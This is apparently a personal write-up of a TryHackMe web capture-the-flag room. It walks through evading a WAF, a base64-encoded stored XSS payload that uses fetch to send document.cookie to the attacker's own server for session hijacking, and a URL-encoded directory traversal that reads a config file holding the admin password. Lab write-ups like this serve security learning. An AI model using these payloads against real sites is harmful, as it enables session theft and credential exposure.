---
created: 2026-01-17
tags:
  - note
  - journal
  - cyberStuff
title: padelify
draft: false
date:
subiect:
  - web
dificultate: 3
amuca: true
link:
  - https://tryhackme.com/room/padelify
lastmod: 2026-10-09T12:40:51.993Z
---
### Reconnaissance

First things first, it's time to look for information.

I tried running a gobuster scan with a common wordlist for discovery, but nothing returned; surely a WAF (Web Application Firewall) is blocking access:\
![](/images/static/Pasted%20image%2020260117111458.png)

Let's try to bypass it. Using the `-a` flag bypasses it pretty simply:\
For beginners (like me), the `-a` flag uses a different User-Agent than the default gobuster agent. A User-Agent is a string of characters that identifies the client making requests to the site.

![](/images/static/Pasted%20image%2020260117112836.png)\
I'm going to try another list; this one is too short, I think:

![](/images/static/Pasted%20image%2020260117113229.png)\
Better this way. Firefart is such a goated name.\
Let's try to access `config`:

![](/images/static/Pasted%20image%2020260117113720.png)\
And the WAF is blocking it again, cool:

Let's try to access the log file:\
![](/images/static/Pasted%20image%2020260117113943.png)\
OK cool, it works:\
![](/images/static/Pasted%20image%2020260117114001.png)\
And we have this cool error message here explaining that XSS (Cross-Site Scripting) attempts may be possible, and also that the `HttpOnly` flag is not set.

### How we are going to break it

A WAF can be bypassed a few ways; one of them is using a base64 encoded string and the functions:\
`atob()` — used to decode base64, and `eval()` for executing the resulting code.

So let's start:

First of all, let's start a server to catch the cookie/flag with `python3 -m http.server 80`.

Then we go to the main sign up page and enter the following into the username field:

```
<body` 
`onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjE0NS40LycrZG9jdW1lbnQuY29va2llKQ=='))">
```

The encoded part is:

```
fetch('http://<YOUR IP>/'+document.cookie)
```

This will go straight to the app and be executed.\
In the password field, just enter something random.

And bam bam bam, we got something:\
![](/images/static/Pasted%20image%2020260117121034.png)

Now we just change our cookie to that string:\
`PHPSESSID=pgulj9vf9eckvcpetht9ma6cmf`

Now we just go and change the cookie (press F12 and go to the Storage section, then Cookies):

![](/images/static/Pasted%20image%2020260117124301.png)

And we have the first flag:\
**Flag:** THM{Logged\_1n\_Moderat0r}

### Second Flag

Note: If you see a different IP, it is because I had to restart the challenge.

I clicked on the Live button in the top right corner of the previous panel and got the following:\
![](/images/static/Pasted%20image%2020260117162139.png)\
And if we look at the URL we see something interesting: `page=match.php`. Let's try to exploit it via directory traversal:\
![](/images/static/Pasted%20image%2020260117162216.png)\
And the WAF is blocking us again:\
![](/images/static/Pasted%20image%2020260117162422.png)

Let's maybe try to encode the character `/`.

I encoded `/` as `%2F` (or `..%2F` for `../`), which is URL encoding:

![](/images/static/Pasted%20image%2020260117162541.png)\
This is something interesting.

Let's try to read the config file with this vulnerability:\
![](/images/static/Pasted%20image%2020260117163601.png)\
Note: Don't forget to encode `.` as `%2E` or else it will not work.\
Cool, very cool, we got it!\
We can see some information in `app.conf` about the admin credentials:\
`admin_info = "bL}8,S9W1o44"`\
Let's try to log in with this.

And with username `admin` and the password from above, we succeeded in logging in:\
![](/images/static/Pasted%20image%2020260117163937.png)\
**Flag:** THM{Logged\_1n\_Adm1n001}\
Very cool challenge, thank you THM!
